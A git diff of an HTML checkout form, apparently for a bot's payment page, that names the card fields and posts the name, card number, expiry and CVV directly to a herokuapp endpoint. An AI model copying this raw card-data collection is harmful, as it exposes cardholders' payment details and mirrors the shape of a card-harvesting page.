@@ -11,7 +11,7 @@
   <!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 </head>
 <body>
-    <form class="checkout">
+    <form class="checkout" action="https://paynowfrombot.herokuapp.com/getValues/" method="post">
         <div class="checkout-header">
           <h1 class="checkout-title">
             Checkout
@@ -20,32 +20,29 @@
           </h1>
         </div>
         <p>
-          <label>Enter name on card</label>
-          <input type="text" class="checkout-input checkout-name" placeholder="Your name" autofocus="">
+          <label for="cardName">Enter name on card</label>
+          <input type="text" name="cardName" class="checkout-input checkout-name" placeholder="Your name" autofocus="">
         </p>
         <p>
           <label style="margin-left: -101px !important;"> Enter card expiry month/year</label>
-          <input type="number" class="checkout-input checkout-exp" placeholder="MM" 
+          <input type="number" name="expMonth" class="checkout-input checkout-exp" placeholder="MM" 
           style="margin-top: 23px !important;margin-left: 2px !important;" size="2" maxlength="2">
-          <input type="number" class="checkout-input checkout-exp" placeholder="YY" 
+          <input type="number" name="expYear" class="checkout-input checkout-exp" placeholder="YY" 
           style="margin-top: 23px !important;margin-left: 10px !important;" size="2" maxlength="2">
         </p>
         <p>
-          <label> Enter card number</label>
-          <input type="number" class="checkout-input checkout-card" placeholder="4111 1111 1111 1111" size="16"
+          <label for="cardNumber"> Enter card number</label>
+          <input type="number" name="cardNumber" class="checkout-input checkout-card" placeholder="4111 1111 1111 1111" size="16"
            maxlength="16">
         </p>
         <p>
-          <label style="
-        margin-left: -46px !important;
-    "> Enter CVV/CVC</label>
-          <input type="number" class="checkout-input checkout-cvc" placeholder="CVC" 
+          <label style="margin-left: -46px !important;" for="cvv"> Enter CVV/CVC</label>
+          <input type="number" name="cvv" class="checkout-input checkout-cvc" placeholder="CVC" 
           style="margin-top: 25px !important;margin-left: 2px !important;" size="3" maxlength="3">
         </p>
 
         <p>
-          <a href='https://paynowfrombot.herokuapp.com/getValues/'>
-          <input type="button" value="Purchase" class="checkout-btn"></a>
+          <input type="submit" value="Purchase" class="checkout-btn">
         </p>
       </form>  
 </body>
